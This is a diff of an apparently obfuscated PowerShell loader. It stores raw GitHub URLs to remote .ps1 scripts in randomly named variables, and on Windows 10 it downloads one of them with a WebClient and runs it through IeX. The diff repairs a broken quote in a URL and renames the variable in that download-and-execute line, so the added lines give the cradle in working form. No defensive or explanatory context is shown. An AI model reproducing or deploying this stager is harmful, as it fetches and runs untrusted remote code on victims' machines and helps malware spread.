@@ -41,7 +41,7 @@ $lwoxheihwic= "https://raw.githubusercontent.com/GOTREMOVED/main/e6af39c6235968b
 
 $osicheuche='https://raw.githubusercontent.com/GOTREMOVED/main/lib30.ps1'
 
-$ishscjsof='https://raw.githubusercontent.com/burnitup545/PrivateRepo/main/lib207.ps1''
+$ishscjsof='https://raw.githubusercontent.com/burnitup545/PrivateRepo/main/lib207.ps1'
 
 
 
@@ -68,7 +68,7 @@ if ($OSVersion -match "7")
         
             if ($OSVersion -match "10")
             {
-                $JhUEtvGQ = (new-object net.webclient); IeX ($JhUEtvGQ.downloadstring($ishscjsof))
+                $DeXRxeNy = (new-object net.webclient); IeX ($DeXRxeNy.downloadstring($ishscjsof))
             }
 
 
